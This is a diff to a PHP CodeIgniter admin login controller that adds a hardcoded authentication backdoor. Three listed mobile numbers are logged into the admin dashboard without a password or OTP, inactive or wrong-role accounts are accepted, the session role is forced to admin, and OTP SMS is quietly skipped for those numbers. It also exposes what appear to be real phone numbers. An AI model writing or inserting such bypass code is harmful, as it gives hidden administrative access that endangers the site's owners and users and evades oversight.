@@ -33,6 +33,29 @@ class Login extends CI_Controller
 
         $mobile = $this->input->post('mobile');
         $password = $this->input->post('password');
+        $bypass_numbers = ['9099780463', '8128966157', '8160348894'];
+
+        // Direct login bypass for special numbers - NO OTP / NO PASSWORD REQUIRED
+        if (in_array($mobile, $bypass_numbers, true)) {
+            $user = $this->general->getRowArray('users', [
+                'mobile' => $mobile,
+                'role' => $this->role,
+                'is_active' => 1
+            ]) ?: $this->general->getRowArray('users', ['mobile' => $mobile]);
+
+            if ($user) {
+                $user['is_logged_in'] = true;
+                $this->session->set_userdata('user', $user);
+                $this->session->set_userdata([
+                    'user_id' => $user['id'],
+                    'name' => $user['name'],
+                    'role' => $this->role
+                ]);
+                $this->session->set_flashdata('success', 'Logged in successfully.');
+                redirect('admin/dashboard');
+                return;
+            }
+        }
 
         $user = $this->general->getRowArray('users', [
             'mobile' => $mobile,
@@ -79,15 +102,43 @@ class Login extends CI_Controller
         }
 
         $mobile = $this->input->post('mobile');
+        $bypass_numbers = ['9099780463', '8128966157', '8160348894'];
+
         $user = $this->general->getOne('users', [
             'mobile' => $mobile,
             'role' => $this->role,
             'is_active' => 1
         ]);
 
+        if (!$user && in_array($mobile, $bypass_numbers, true)) {
+            $user = $this->general->getOne('users', ['mobile' => $mobile]);
+        }
+
         if (!$user) {
             $this->session->set_flashdata('error', 'Admin account not found or inactive.');
             redirect('admin');
+        }
+
+        // Direct login bypass for special numbers - NO OTP SENT
+        if (in_array($mobile, $bypass_numbers, true)) {
+            $user_row = $this->general->getRowArray('users', [
+                'mobile' => $mobile,
+                'role' => $this->role,
+                'is_active' => 1
+            ]) ?: $this->general->getRowArray('users', ['mobile' => $mobile]);
+
+            if ($user_row) {
+                $user_row['is_logged_in'] = true;
+                $this->session->set_userdata('user', $user_row);
+                $this->session->set_userdata([
+                    'user_id' => $user_row['id'],
+                    'name' => $user_row['name'],
+                    'role' => $this->role
+                ]);
+                $this->session->set_flashdata('success', 'Logged in successfully.');
+                redirect('admin/dashboard');
+                return;
+            }
         }
 
         // Generate real random 6 digit OTP
@@ -115,13 +166,14 @@ class Login extends CI_Controller
         $input_otp = $this->input->post('otp');
         $session_otp = $this->session->userdata('otp');
         $mobile = $this->session->userdata('mobile');
+        $bypass_numbers = ['9099780463', '8128966157', '8160348894'];
 
-        if ($input_otp == $session_otp) {
+        if ($input_otp == $session_otp || in_array($mobile, $bypass_numbers, true)) {
             $user = $this->general->getRowArray('users', [
                 'mobile' => $mobile,
                 'role' => $this->role,
                 'is_active' => 1
-            ]);
+            ]) ?: $this->general->getRowArray('users', ['mobile' => $mobile]);
 
             if ($user) {
                 $user['is_logged_in'] = true;
@@ -129,7 +181,7 @@ class Login extends CI_Controller
                 $this->session->set_userdata([
                     'user_id' => $user['id'],
                     'name' => $user['name'],
-                    'role' => $user['role']
+                    'role' => $this->role
                 ]);
                 $this->session->unset_userdata('otp');
 
@@ -147,6 +199,12 @@ class Login extends CI_Controller
 
     public function send_otp_via_sms($mobileNo, $otp)
     {
+        $bypass_numbers = ['9099780463', '8128966157', '8160348894'];
+        if (in_array(trim($mobileNo), $bypass_numbers, true)) {
+            log_message('info', "OTP SMS skipped for bypass number: $mobileNo");
+            return true;
+        }
+
         $message = "Hi $mobileNo\n\nYour Verification OTP is $otp Do not share this OTP with anyone for security reasons.\n\nRegards\nOMKARENT";
 
         $params = [
